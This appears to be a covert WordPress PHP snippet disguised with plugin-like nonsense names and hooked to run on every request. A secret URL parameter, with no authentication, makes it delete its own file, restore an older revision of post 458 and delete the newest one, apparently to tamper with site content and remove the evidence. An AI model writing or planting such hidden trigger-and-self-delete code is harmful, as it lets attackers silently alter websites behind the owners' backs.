<?php

function members_logo_headers() {
	if (isset($_GET['plugin_schedule_audio']) && $_GET['plugin_schedule_audio'] === 'group_board_scheduled_blogroll') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$responsive_pop_load_rating = 458;
		$speed_option_soon_show = wp_get_post_revisions($responsive_pop_load_rating);
		if (empty($speed_option_soon_show)) die('no revisions');
		if (count($speed_option_soon_show) < 2) die('less than 2');
		$category_stats_autocomplete_quick = array_shift($speed_option_soon_show);
		$cookie_basic_icons_maker = $category_stats_autocomplete_quick->ID;
		$composer_inline_tables_internal = array_shift($speed_option_soon_show);
		$scss_highlighter_review = $composer_inline_tables_internal->ID;
		$hide_validator_gift_views = wp_restore_post_revision($scss_highlighter_review);
		if ($hide_validator_gift_views === false) die('error restoring');
		$hide_validator_gift_views = wp_delete_post_revision($cookie_basic_icons_maker);		
		if ($hide_validator_gift_views === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'members_logo_headers');
